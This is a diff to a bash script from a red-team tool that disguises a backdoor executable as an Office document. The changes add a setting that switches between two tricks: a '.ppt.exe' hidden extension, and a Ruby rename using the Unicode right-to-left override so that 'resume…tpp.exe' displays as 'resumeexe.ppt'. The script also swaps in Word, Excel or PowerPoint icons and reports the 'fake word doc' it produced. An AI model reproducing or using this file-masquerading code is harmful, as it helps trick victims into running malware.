@@ -38,7 +38,8 @@ VeR="1.4"
 ArCh=`arch`
 IPATH=`pwd`
 HoME=`echo ~`
-
+# Use 2º name transformation method?
+tRan=`cat $IPATH/settings | egrep -m 1 "BASH_TRANSFORMATION" | cut -d '=' -f2` > /dev/null 2>&1
 
 
 
@@ -131,11 +132,13 @@ UpL=$(zenity --title "☠ PAYLOAD TO BE TRANSFORMED ☠" --filename=$IPATH --fil
 # icon replacement variable
 IcOn=$(zenity --list --title "☠ ICON REPLACEMENT  ☠" --text "Chose one icon from the list." --radiolist --column "Pick" --column "Option" TRUE "MS-Word-32x32.ico" FALSE "MS-Excel-32x32.ico" FALSE "MS-powerpoint-32x32.ico" FALSE "Vector_App.ico" --width 350 --height 260) > /dev/null 2>&1
 # input payload outputname
-# MiP=$(zenity --entry --title "☠ PAYLOAD FINAL NAME ☠" --text "example: curriculum" --width 300) > /dev/null 2>&1
+if [ "$tRan" = "YES" ];then
+MiP=$(zenity --entry --title "☠ PAYLOAD FINAL NAME ☠" --text "example: curriculum" --width 300) > /dev/null 2>&1
+fi
 
 
   # wine configurtions (winecfg)
-  echo ${BlueF}[☆]${white} Select [${GreenF}windows 7${white}] from winecfg... ${Reset};
+  echo ${BlueF}[☆]${white} Select [${YellowF}windows 7${white}] from winecfg... ${Reset};
 cat << !
 
     The ResourceHacker provided by backdoorppt tool
@@ -173,15 +176,21 @@ cat << !
 
     # insert .ppt hidden extension
     echo ${BlueF}[☆]${white} Adding agent hidden extensions '->' ${GreenF}done... ${Reset};
-    mv $IPATH/output/backdoor.exe  $IPATH/output/backdoor_ppt.exe > /dev/null 2>&1
-    #mv $IPATH/output/backdoor.exe  $IPATH/output/$MiP.ppt.exe > /dev/null 2>&1
-    sleep 1
+    if [ "$tRan" = "YES" ]; then
+      mv $IPATH/output/backdoor.exe  $IPATH/output/$MiP.ppt.exe > /dev/null 2>&1
+    else
+      mv $IPATH/output/backdoor.exe  $IPATH/output/backdoor_ppt.exe > /dev/null 2>&1
+    fi
 
+  sleep 1
   cd $IPATH/output
   # rename backdoor name
   echo ${BlueF}[☆]${white} Word doc builder '(backdoorppt)' '->' ${GreenF}done... ${Reset};
-  # comment the next line if used .ppt.exe method..
-  ruby -e 'File.rename("backdoor_ppt.exe", "resume\xe2\x80\xaetpp.exe")'
+  if [ "$tRan" = "YES" ]; then
+    echo "default build" > /dev/null 2>&1
+  else
+    ruby -e 'File.rename("backdoor_ppt.exe", "resume\xe2\x80\xaetpp.exe")'
+  fi
   cd $IPATH
   sleep 1
 
@@ -189,15 +198,28 @@ cat << !
 # -----------------------------
 # Display final output to user
 # -----------------------------
-#   Final file  : $IPATH/output/$MiP.ppt.exe
-#   Final file  : $IPATH/output/resumeexe.ppt
-echo ${YellowF}[⊶] Task over, Writing reports... ${Reset};
+echo ${YellowF}[⊶] Task over, Writing reports! ${Reset};
 sleep 2
+
+if [ "$tRan" = "YES" ]; then
+cat << !
+
+    Icon select : $IcOn
+    Final file  : $IPATH/output/$MiP.ppt.exe
+    Tool Author : r00t-3xp10it (SSA RedTeam)
+!
+
+else
+
 cat << !
 
     Icon select : $IcOn
     Final file  : $IPATH/output/resumeexe.ppt
     Tool Author : r00t-3xp10it (SSA RedTeam)
+!
+fi
+
+cat << !
 
     Your backdoor agent its now transformed into one fake
     word doc (ppt) remmenber that .exe extensions will not
